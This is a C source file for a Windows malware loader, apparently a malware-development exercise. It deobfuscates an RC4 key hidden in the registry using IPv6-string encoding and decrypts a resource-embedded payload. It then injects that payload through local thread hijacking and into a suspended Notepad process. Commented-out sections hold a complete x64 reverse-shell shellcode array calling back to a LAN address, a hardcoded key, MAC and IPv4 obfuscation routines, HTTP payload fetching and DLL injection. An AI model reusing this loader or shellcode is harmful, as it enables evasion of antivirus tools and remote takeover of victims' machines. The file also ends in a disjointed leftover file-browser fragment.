#include "main.h"
typedef void(WINAPI* pdllMainFunction)();
int main()
{
	HANDLE hProcess = - 1, hProcess1, hProcess2, hThread, hThread1;
	DWORD  dwPID0 = 0, dwPID1, dwPID2 = 0, dwOldProtections, dwThreadId;
	PUCHAR pObfInput, * pObfOutput, pKey, pExtPayloadAddres;;
	SIZE_T sBytesWritten, sPaddedInputSize = 64, sObfuscatedSize = 0, sClearPayload = 0, sOriginalInputSize = 64;
	Context RC4Context_t;
	RESOURCE resource;
	PVOID pExPayload, pMain;

	if (!EnumProcNTQuerySystemInformation(L"Notepad.exe", &dwPID0, &hProcess))printf("[!] Enumerate Processes Nt Query System Information Failed to Find svchost\n");

	if(!ReadRegKeys(
		&pObfOutput, 
		&sObfuscatedSize
	)) return -1;

	if (!(pKey = LocalAlloc(
		LPTR,
		256
	))) return -2;

	if (!DeobfuscatePayloadIPv6(
		(PUCHAR*)&pKey, 
		pObfOutput, 
		sObfuscatedSize + 1, &sClearPayload, 
		(unsigned char)(sPaddedInputSize - sOriginalInputSize)
	)) return -3;

	
	/*
	if (!FetchLocalThreadHandle(
		GetCurrentThreadId(),
		&dwPID2,
		&hThread1)
		)return -4;
	*/
	strcat_s((char*)pKey, 256, "\n");

	if (!FetchResource(
		&resource
	)) return -5;
	PAYLOAD
		pPayload_t = {
			.pText = LocalAlloc(LPTR, resource.sSize),
			.sText = resource.sSize
	};

	if (!rInit(
		&RC4Context_t, 
		pKey, 
		strlen((CHAR*)pKey)
	)) return -6;

	rFin(&RC4Context_t, resource.pAddress, pPayload_t.pText, resource.sSize);

	CreateSacrificialThread(&dwThreadId, &hThread1);

	HijackLocalThread(hThread1, pPayload_t.pText, pPayload_t.sText);

	if (!CreateSuspendedProcess(
		"Notepad.exe",
		&dwPID0,
		&hProcess,
		&hThread
	)) return -7;

	if (!InjectRemoteProcessShellcode(
		hProcess, 
		pPayload_t.pText, 
		pPayload_t.sText, 
		(PVOID *)&pExtPayloadAddres
	)) return -8;

	if (!HijackThread(
		hThread1, 
		pExtPayloadAddres
	))return -9;


	/*

	HijackLocalThread(hThread, pPayload_t.pText, pPayload_t.sText);

	if (!ResumeThread(hThread)) return  -4;

	WaitForSingleObject(hThread, INFINITE);

	if (!(pExPayload = VirtualAllocEx(hProcess, 0, pPayload_t.sText, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)))return -8;

	if (!WriteProcessMemory(hProcess, pExPayload, pPayload_t.pText, pPayload_t.sText, &sBytesWritten)) printf("[x] WriteProcessMemory Failed!\n");

	printf("Retrieved Payload: %s\n", (char*)pPayload_t.pText);

	RtlSecureZeroMemory(pPayload_t.pText, resource.sSize + 1);




	if (!VirtualProtectEx(hProcess, pExPayload, pPayload_t.sText, PAGE_EXECUTE, &dwOldProtections)) return -5;

	if (!(hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pExPayload, NULL, 0, 0))) return -6;
	*/
	
	//RtlSecureZeroMemory(pKey, strlen((char *)pKey));


	//if (!(dwPID0 = GetCurrentProcessId())) return -3;

	//if ((hProcess =OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID0)) == INVALID_HANDLE_VALUE) return -2;

	//if (!EnumRemoteProcessHandle(L"Notepad.exe", &dwPID0, &hProcess)) printf("[!] Enumerate Remote Processes Handles Failed To Find Chrome\n");


	//hProcess2 = FetchProcess(L"Notepad.exe", &pid2);

	//if (!(hThread= CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&FetchDrives,  NULL, CREATE_SUSPENDED, &dwThreadId))) return FALSE;


	/*
	
	unsigned char buf[] = { 0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xcc, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x51, 0x56, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x4d, 0x31, 0xc9, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x66, 0x81, 0x78, 0x18, 0x0b, 0x02, 0x0f, 0x85, 0x72, 0x00, 0x00, 0x00, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x44, 0x8b, 0x40, 0x20, 0x50, 0x49, 0x01, 0xd0, 0x8b, 0x48, 0x18, 0xe3, 0x56, 0x4d, 0x31, 0xc9, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x48, 0x31, 0xc0, 0x41, 0xc1, 0xc9, 0x0d, 0xac, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x41, 0x58, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x4b, 0xff, 0xff, 0xff, 0x5d, 0x49, 0xbe, 0x77, 0x73, 0x32, 0x5f, 0x33, 0x32, 0x00, 0x00, 0x41, 0x56, 0x49, 0x89, 0xe6, 0x48, 0x81, 0xec, 0xa0, 0x01, 0x00, 0x00, 0x49, 0x89, 0xe5, 0x49, 0xbc, 0x02, 0x00, 0x11, 0x5c, 0xc0, 0xa8, 0x01, 0xe7, 0x41, 0x54, 0x49, 0x89, 0xe4, 0x4c, 0x89, 0xf1, 0x41, 0xba, 0x4c, 0x77, 0x26, 0x07, 0xff, 0xd5, 0x4c, 0x89, 0xea, 0x68, 0x01, 0x01, 0x00, 0x00, 0x59, 0x41, 0xba, 0x29, 0x80, 0x6b, 0x00, 0xff, 0xd5, 0x6a, 0x0a, 0x41, 0x5e, 0x50, 0x50, 0x4d, 0x31, 0xc9, 0x4d, 0x31, 0xc0, 0x48, 0xff, 0xc0, 0x48, 0x89, 0xc2, 0x48, 0xff, 0xc0, 0x48, 0x89, 0xc1, 0x41, 0xba, 0xea, 0x0f, 0xdf, 0xe0, 0xff, 0xd5, 0x48, 0x89, 0xc7, 0x6a, 0x10, 0x41, 0x58, 0x4c, 0x89, 0xe2, 0x48, 0x89, 0xf9, 0x41, 0xba, 0x99, 0xa5, 0x74, 0x61, 0xff, 0xd5, 0x85, 0xc0, 0x74, 0x0a, 0x49, 0xff, 0xce, 0x75, 0xe5, 0xe8, 0x93, 0x00, 0x00, 0x00, 0x48, 0x83, 0xec, 0x10, 0x48, 0x89, 0xe2, 0x4d, 0x31, 0xc9, 0x6a, 0x04, 0x41, 0x58, 0x48, 0x89, 0xf9, 0x41, 0xba, 0x02, 0xd9, 0xc8, 0x5f, 0xff, 0xd5, 0x83, 0xf8, 0x00, 0x7e, 0x55, 0x48, 0x83, 0xc4, 0x20, 0x5e, 0x89, 0xf6, 0x6a, 0x40, 0x41, 0x59, 0x68, 0x00, 0x10, 0x00, 0x00, 0x41, 0x58, 0x48, 0x89, 0xf2, 0x48, 0x31, 0xc9, 0x41, 0xba, 0x58, 0xa4, 0x53, 0xe5, 0xff, 0xd5, 0x48, 0x89, 0xc3, 0x49, 0x89, 0xc7, 0x4d, 0x31, 0xc9, 0x49, 0x89, 0xf0, 0x48, 0x89, 0xda, 0x48, 0x89, 0xf9, 0x41, 0xba, 0x02, 0xd9, 0xc8, 0x5f, 0xff, 0xd5, 0x83, 0xf8, 0x00, 0x7d, 0x28, 0x58, 0x41, 0x57, 0x59, 0x68, 0x00, 0x40, 0x00, 0x00, 0x41, 0x58, 0x6a, 0x00, 0x5a, 0x41, 0xba, 0x0b, 0x2f, 0x0f, 0x30, 0xff, 0xd5, 0x57, 0x59, 0x41, 0xba, 0x75, 0x6e, 0x4d, 0x61, 0xff, 0xd5, 0x49, 0xff, 0xce, 0xe9, 0x3c, 0xff, 0xff, 0xff, 0x48, 0x01, 0xc3, 0x48, 0x29, 0xc6, 0x48, 0x85, 0xf6, 0x75, 0xb4, 0x41, 0xff, 0xe7, 0x58, 0x6a, 0x00, 0x59, 0x49, 0xc7, 0xc2, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5 };

	Context rcContext;
	
	size_t sBuff = 511;

	RESOURCE Resoursce_t;


	
	if (!FetchResource(&Resoursce_t)) return -1;

	unsigned char* pCipher = malloc(Resoursce_t.sSize + 1);

unsigned char key[256] = { '\0' };
	memcpy(key, "c12811e13ed75afe3e0945ef34e8a25b9d321a46e131c6463731de25a21b39eb", 256);

	rInit(&rcContext, key, strlen((char *)key));
	rFin(&rcContext, buf, pCipher, sBuff);
	PrintHexData("Cipher Text Data:",pCipher, sBuff);
	*/
	//CheckVM();
	

 	//if (system("pause"))printf("f\n");

	//LPWSTR ProcessName = LocalAlloc(LPTR, 128);

	//memcpy(ProcessName,(L"Notepad.exe"), sizeof(WCHAR) * wcslen(L"Notepad.exe\0"));


	//printf("[i] Reached End Of Searching.\n");
	
	 //*Initiate Payload Obfuscation


	
	//if (!(pObfInput = LocalAlloc(LPTR, 129))) return -1;

	//memset(pObfInput, '\0', 129);

	//CHAR testcase[65] = "c12811e13ed75afe3e0945ef34e8a25b9d321a46e131c6463731de25a21b39eb\0";


	//printf("[!] Key: c12811e13ed75afe3e0945ef34e8a25b9d321a46e131c6463731de25a21b39eb\n[!] Key Length: %zu\n", strlen("c12811e13ed75afe3e0945ef34e8a25b9d321a46e131c6463731de25a21b39eb\0"));

	//memcpy(pObfInput, "c12811e13ed75afe3e0945ef34e8a25b9d321a46e131c6463731de25a21b39eb\n", 128);
	
	// strlen((char *)pObfInput),
	
	//size_t sPaddedInputSize = 64, ;

	//pClearPayload = LocalAlloc(LPTR, sClearPayload + 1);
	/*
	 * MACFuscation
	 *

	size_t sOriginalInputSize = strlen((char *)pObfInput), sPaddedInputSize = 0, sObfuscatedSize = 0, sClearPayload = 0;

	printf("[i] MAC Input: %s\n[i] IPv6 Input's Length: %zu\n", (char *)pObfInput, sOriginalInputSize);

	for (int i = 0; i < 48; i++) printf("--");

	printf("\n");

	ObfuscatePayloadMAC(pObfInput, &pObfOutput, sOriginalInputSize, &sPaddedInputSize, &sObfuscatedSize);

	printf("[i] MAC  Obfuscated Output:\n");

	for (int i = 0; i < (int)(sPaddedInputSize / MAC); i++) printf("\t[%d] -  %s | Output Length:%zu\n", i, (char*)pObfOutput[i], strlen((char*)pObfOutput[i]));

	//RtlMacToStrA((char **)pObfOutput, (int)(sPaddedInputSize / MAC), (unsigned char)(sPaddedInputSize - sOriginalInputSize),&pClearPayload, &sClearPayload);

	DeobfuscatePayloadMAC(&pClearPayload, pObfOutput, sObfuscatedSize, &sClearPayload, (Uchar)(sPaddedInputSize - sOriginalInputSize));

	printf("\n[i] MAC Deobfuscated Output: %s\n[i] MAC Deobfuscated Output's Length:%zu\n", (char *)pClearPayload, strlen((char*)pClearPayload));

	for (int i = 0; i < 48; i++) printf("--");

	printf("\n");
	*/
	/*IPv4Fuscation

	printf("[i] IPv4 Input: %s\n[i] IPv6 Input's Length: %zu\n", (char *)pObfInput, sOriginalInputSize);

	for (int i = 0; i < 48; i++) printf("--");

	printf("\n");

	ObfuscatePayloadIPv4(pObfInput, &pObfOutput, sOriginalInputSize, &sPaddedInputSize, &sObfuscatedSize);

	printf("[i] IPv4 Obfuscated Output:\n");

	for (int i = 0; i < (int)(sPaddedInputSize/IPv4); i++) printf("\t[%d] -  %s | Output Length:%zu\n", i, (char *)pObfOutput[i], strlen((char*)pObfOutput[i]));

	for (int i = 0; i < 48; i++) printf("--");

	printf("\n");

	//RtlIpv4toStrA(pObfOutput, (int)(sPaddedInputSize / IPv4), (unsigned char)(sPaddedInputSize - sOriginalInputSize), &pClearPayload, &sClearPayload);

	DeobfuscatePayloadIPv4(&pClearPayload, pObfOutput, sObfuscatedSize, &sClearPayload, (unsigned char)(sPaddedInputSize - sOriginalInputSize));

	printf("\n[i] IPv4 Deobfuscated Output: %s\n[i] IPv4 Deobfuscated Output's Length:%zu\n", (char *)pClearPayload, strlen((char*)pClearPayload));

	for (int i = 0; i < 48; i++) printf("--");

	printf("\n");
	*/
	//Ipv6Fuscation
	//printf("[i] IPv6 Input: %s\n[i] IPv6 Input's Length: %zu\n", (*pObfInput), sOriginalInputSize);
	//size_t NumberOfElements = sObfuscatedSize / (IPv6Arr - 1);
	//for (int i = 0; i < 48; i++) printf("--");

	//printf("\n");

	//ObfuscatePayloadIPv6(pObfInput, &pObfOutput, sOriginalInputSize, &sPaddedInputSize, &sObfuscatedSize);

	//printf("[i] IPv6 Obfuscated Output:\n");

	//for (size_t i = 0; i < NumberOfElements; i++) { printf("\t[%d] -  %s | Output Length:%zu\n", i, (char*)pObfOutput[i], strlen((char*)pObfOutput[i])); }

	//RtlIpv6ToStrA((char**)pObfOutput, (int)(sPaddedInputSize / IPv6), (unsigned char)(sPaddedInputSize - sOriginalInputSize), &pClearPayload, &sClearPayload);
	
	//for (size_t i = 0; i < strlen(testcase); i++) {if ((UCHAR)testcase[i] != pKeysetup[i]) { printf(" [! %zu]", i); return -4;}}

	//strcat_s(pKey, 256, "\n");


	//CloseHandle(hProcess);

getchar();
	char pPath[MAX_PATH] = { '\0' };

	printf("[#] Payload Created Successfully! :)\n");
	printf("[#] Press 'Enter' To Exit! :)");
	return 0;
}

/*

	SIZE_T sPayload = 0;

	PBYTE pPayload;

	if (!FetchPayloadHttpDynamic(L"http://127.0.0.1:8000/Resources/Test1.jpg", &pPayload, &sPayload)) printf("[x] Failed :(\n");

	else printf("[!] Success\n");

	DWORD dwProcessId;

	lpPAYLOAD pText_t;

	HANDLE hProcess;

	RESOURCE resource;

	if (!FetchResource(&resource)) return -1;

	if (!EnumRemoteProcessHandle(L"svchost.exe", &dwProcessId, &hProcess)) return -2;

	//if ((hProcess = FetchProcess(L"notepad.exe", &dwProcessId)) == INVALID_HANDLE_VALUE) { printf("Couldn't Find it:(\n"); }

	//if (!InjectDll(hProcess, L"C:\\Users\\mikmu\\Desktop\\DLL.dll")) return -2;


	//WritePayloadToRegistery(resource.pAddress, (DWORD) resource.sSize);

	//call();

	//Test();

	if (!(pText_t = Test())) return -5;

	if (!InjectShellcode(hProcess, (PBYTE)pText_t->pText, pText_t->sText)) return -6;

	unsigned char *pK[256] = {'\0'};

	printf("[!] Enter Your Key Please:\n");

	fgets(pK, 255, stdin);

	unsigned char *pDecryptedPayload = malloc(pText_t->sText);

	Context context_t;
	*/

	//if (!VirtualProtectEx(hProcess, pExPayload, pPayload_t.sText, dwOldProtections, &dwOldProtections)) return - 7;

	//BOOL State = WriteProcessMemory(hProcess, pExPayload, "\0", pPayload_t.sText, &sBytesWritten);
	//printf("%d" ,State);

	//printf("\n[i] IPv6 Deobfuscated Output: %s\n[i] IPv6 Deobfuscated Output's Length:%zu\n", (char *)pKey, strlen((char*)pKey));

	//for (int i = 0; i < 48; i++) printf("--");

	//printf("\n");
	/*/



	//printf("[i] Payload in main: %s\n[i] Payload Heap Address: 0x%p\n[!] Decrypting Payload...\n",pText_t->pText, pText_t->pText);

	//DWORD dwOldRights;

	//if (!VirtualProtect(pText_t->pText, pText_t->sText, PAGE_EXECUTE_READ, &dwOldRights)) return -2;

	//DWORD dwThreadPid;

	//HANDLE hThread = CreateThread(NULL, 0, pText_t->pText, NULL, 0, &dwThreadPid);

	WCHAR pPath[MAX_PATH] = { L'\0' };

	FetchDrives(pPath);

	if (!pPath[0]) {printf("[X] Failed To Fetch Drives!\n[X] Exiting With Error Code: %x\n", GetLastError()); return -1;}

	PrintDrives(pPath);

	while (!UserInputDrives(pPath)) { printf("[X] Wrong Input!\n"); PrintDrives(pPath);}

	PrintCWD(pPath);

	WIN32_FIND_DATA_ARRAYW *pFiles_arr_t = FetchFileArrayW(pPath);

	if (pFiles_arr_t == NULL)
	{
		printf("[X] Fetching Folders Failed\nError Code:0x%.8x\n", GetLastError());
		return -2;
	}

	PrintFilesArrayW(pFiles_arr_t);

	UserInputFolders(pPath, pFiles_arr_t);

	while (!UserInputContinueFolders()) {

		if (pFiles_arr_t == NULL) {
			printf("[!] No Files Under Current Folder.\n");
			break;
		}
		FreeFileArray(pFiles_arr_t);

		pFiles_arr_t = FetchFileArrayW(pPath);

		PrintCWD(pPath);

		PrintFilesArrayW(pFiles_arr_t);

		UserInputFolders(pPath, pFiles_arr_t);
	}

	PrintCWD(pPath);
	wprintf(L"File Name: %s", pFiles_arr_t->pFilesArr[0].pFileName);


	if(pFiles_arr_t != NULL)FreeFileArray(pFiles_arr_t);
	HANDLE hFile = INVALID_HANDLE_VALUE;
/*
 * GENERIC_READ = 0x80000000
 * GENERIC_WRITE = 0x40000000. (0d1073741824).
 * GENERIC_READ | GENERIC_WRITE = 0xC0000000. (0d3221225472).
 */
